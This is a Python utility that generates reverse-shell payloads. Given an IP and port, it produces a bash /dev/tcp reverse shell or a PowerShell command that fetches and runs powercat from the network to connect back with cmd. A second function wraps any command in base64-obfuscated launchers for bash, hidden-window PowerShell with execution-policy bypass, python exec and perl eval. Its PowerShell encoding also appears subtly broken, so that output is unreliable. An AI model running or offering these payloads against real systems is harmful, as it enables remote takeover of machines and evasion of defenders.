#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "unihonest"
__license__ = "GNU General Public License v3.0"

import re
import base64

def validate_ip(ip):
    ip_regex = r'^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    return re.match(ip_regex, ip) is not None

def validate_port(port):
    try:
        port_number = int(port)
        return 0 <= port_number <= 65535
    except ValueError:
        return False

def update_shell_reverse(ip, port, format_type):
    if validate_ip(ip) and validate_port(port):
        if format_type.lower() == 'bash':
            result = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        elif format_type.lower() == 'powershell':
            result = f"powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c {ip} -p {port} -e cmd"
        else:
            result = "不支持的格式。请选择'Bash'或'PowerShell'。"
    else:
        result = '请输入正确的IP与端口。'

    return result


def shell_to_base64(input_text, option):
    if not input_text:
        return ''
    
    if option == 'bash':
        output = f"bash -c {{echo,{base64.b64encode(input_text.encode()).decode()}}} | {{base64,-d}} | {{bash,-i}}"
    elif option == 'powershell':
        # PowerShell expects a string encoded in UTF-16LE with null bytes between characters.
        posh_input = ''.join([char + '\0' for char in input_text])
        output = f"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc {base64.b64encode(posh_input.encode('utf-16le')).decode()}"
    elif option == 'python':
        output = f"python -c exec(base64.b64decode('{base64.b64encode(input_text.encode()).decode()}').decode())"
    elif option == 'perl':
        output = f"perl -MMIME::Base64 -e eval(decode_base64('{base64.b64encode(input_text.encode()).decode()}'))"
    else:
        output = ''
    
    return output